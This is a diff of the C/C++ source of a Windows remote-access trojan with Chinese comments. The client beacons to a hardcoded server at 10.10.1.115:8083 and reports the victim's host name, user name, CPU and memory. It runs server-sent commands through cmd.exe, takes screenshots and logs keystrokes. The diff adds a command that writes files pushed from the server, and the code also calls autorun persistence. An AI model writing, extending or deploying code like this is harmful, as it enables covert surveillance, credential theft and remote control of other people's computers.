@@ -5,8 +5,11 @@
 #define MSG_LENN 5120
 
 
-char* ServerIp;
-int ServerPort;
+// cpu
+DWORD deax;
+DWORD debx;
+DWORD decx;
+DWORD dedx;  
 
 
 // 执行命令
@@ -39,20 +42,19 @@ int cmd(char *cmdStr, char *message)
 	si.hStdOutput = si.hStdError = hWrite;  // 输出流和错误流指向管道写的一头
 
 	// 拼接 cmd 命令
-	sprintf(command, "cmd.exe /c %s", cmdStr);
+	snprintf(command, sizeof(command), "cmd.exe /c %s", cmdStr);
 
 	// 创建子进程,运行命令,子进程是可继承的
 	if (!CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
 		CloseHandle(hRead);
 		CloseHandle(hWrite);
-		//printf("error!");
 		return 1;
 	}
 	CloseHandle(hWrite);
 
 	// 读取管道的read端,获得cmd输出
 	while (ReadFile(hRead, buf, MSG_LENN, &readByte, NULL)) {
-		strcat(message, buf);
+		strcat_s(message, 5120, buf);
 		ZeroMemory(buf, MSG_LENN);
 	}
 	CloseHandle(hRead);
@@ -60,6 +62,76 @@ int cmd(char *cmdStr, char *message)
 	return 0;
 }
 
+
+// 获取cpu
+void initCpu(DWORD veax)
+{
+	__asm
+	{
+		mov eax, veax
+		cpuid
+		mov deax, eax
+		mov debx, ebx
+		mov decx, ecx
+		mov dedx, edx
+	}
+}
+
+
+char* getCpuType()
+{
+	const DWORD id = 0x80000002; // start 0x80000002 end to 0x80000004  
+	char cpuType[49];
+	memset(cpuType, 0, sizeof(cpuType));
+
+	for (DWORD t = 0; t < 3; t++)
+	{
+		initCpu(id + t);
+
+		memcpy(cpuType + 16 * t + 0, &deax, 4);
+		memcpy(cpuType + 16 * t + 4, &debx, 4);
+		memcpy(cpuType + 16 * t + 8, &decx, 4);
+		memcpy(cpuType + 16 * t + 12, &dedx, 4);
+	}
+
+	return cpuType;
+}
+
+
+// 获取内存
+u_int64 getMemory() {
+	int nMB = 1024 * 1024;
+	PERFORMANCE_INFORMATION stPerformance = { 0 };
+	int cb = sizeof(stPerformance);
+	GetPerformanceInfo(&stPerformance, cb);
+	int nPageSize = stPerformance.PageSize;
+	INT64 i64PhyTotal = (INT64)stPerformance.PhysicalTotal * nPageSize / nMB;
+	return i64PhyTotal;
+}
+
+
+int recvFile(SOCKET client, char *filename) {
+	int FILELEN;
+	char FILE_BUF[1024] = { 0 };
+	ofstream out;
+	out.open(filename, ios_base::app | ios::binary);
+	while (true)
+	{
+		ZeroMemory(FILE_BUF, sizeof(FILE_BUF));  // 接收文件数据
+		FILELEN = recv(client, FILE_BUF, sizeof(FILE_BUF), 0);
+		if (strlen(FILE_BUF) < 5) 
+		{
+			if (strcmp(FILE_BUF, "EOF") == 0)
+			{
+				break;
+			}
+		}
+		out << FILE_BUF;  // 写二进制文件流
+	}
+	Sleep(5000);
+	out.close();
+	return 0;
+}
 
 void c_socket()
 {
@@ -81,25 +153,29 @@ void c_socket()
 		return;
 	}
 
-	// 获取主机名、用户名
-	const int MAX_BUFFER_LEN = 500;
+	// 获取主机名、用户名、内存、cpu
+	const int MAX_BUFFER_LEN = 1000;
+	u_int64 memInfo;
 	char userName[MAX_BUFFER_LEN];
 	char comName[MAX_BUFFER_LEN];
 	char comInfo[MAX_BUFFER_LEN];
+	char* cpuInfo;
 	DWORD nameLen;
 	DWORD comLen;
 	nameLen = MAX_BUFFER_LEN;
 	comLen = MAX_BUFFER_LEN;
+	memInfo = getMemory();
+	cpuInfo = getCpuType();
 	GetUserName(userName, &nameLen);
 	GetComputerName(comName, &comLen);
-	snprintf(comInfo, sizeof(comInfo), "%s@%s", comName, userName);
+	snprintf(comInfo, sizeof(comInfo), "%s~%s~%s~%llu", comName, userName, cpuInfo, memInfo);
 
 
 	// 连接到服务器.
 	sockaddr_in clientService;
 	clientService.sin_family = AF_INET;
-	clientService.sin_addr.S_un.S_addr = inet_addr(ServerIp);
-	clientService.sin_port = htons(ServerPort);
+	clientService.sin_addr.S_un.S_addr = inet_addr("10.10.1.115");
+	clientService.sin_port = htons(8083);
 	while (1) {
 		if (connect(client, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
 			Sleep(20000);
@@ -148,7 +224,6 @@ void c_socket()
 			continue;
 		}
 		else if (strcmp(recvCmd, "close") == 0) {  // 关闭客户端
-			send(client, "Client has exit!", 16, 0);
 			exit(0);
 		}
 		else if (strcmp(recvCmd, "screenshot") == 0) {  // 截屏
@@ -180,7 +255,7 @@ void c_socket()
 				Sleep(5);
 				for (int i = 8; i <= 255; i++)
 				{
-					if (GetAsyncKeyState(i) & 1 == 1)  // 判断虚拟按键是否按下，无论是一直按着还是按一下就弹起，只判断是否按过
+					if ((GetAsyncKeyState(i) & 1) == 1)  // 判断虚拟按键是否按下，无论是一直按着还是按一下就弹起，只判断是否按过
 					{
 						KeyName = GetKeyName(i);
 						FileStream.write(KeyName.c_str(), KeyName.size());
@@ -194,7 +269,11 @@ void c_socket()
 		else if (strcmp(recvCmd, "download") == 0) {  // 上传文件
 			continue;
 		}
-		else if (strcmp(recvCmd, "upload") == 0) {  // 下载文件
+		else if ((recvCmd[0] == '^')) {  // 下载文件
+			ZeroMemory(recvCmd, sizeof(recvCmd));
+			recv(client, recvCmd, MSG_LEN, 0);
+			recvFile(client, recvCmd);
+			Sleep(2000);
 			continue;
 		}
 		else if ((recvCmd[0] == '$')) {
@@ -205,7 +284,6 @@ void c_socket()
 				CMD[i - 1] = recvCmd[i];
 			}
 			if (!cmd(CMD, message)) send(client, message, strlen(message), 0);
-			else send(client, "CMD Error!\n", 12, 0);
 			continue;
 		}
 		else {
@@ -553,10 +631,11 @@ int autoRun()
 }
 
 
-int main(int argc, char** argv)
+int main()
 {
 	autoRun();
-	Ring3ProtectProcess();
+	//Ring3ProtectProcess();
+	/*
 	if (argc >= 2)
 	{
 		ServerIp = argv[1];
@@ -567,6 +646,9 @@ int main(int argc, char** argv)
 		ServerIp = "10.10.1.115";
 		ServerPort = 8083;
 	}
+	*/
+	//ServerIp = "10.10.1.115";
+	//ServerPort = 8083;
 	c_socket();
 	return 0;
 }
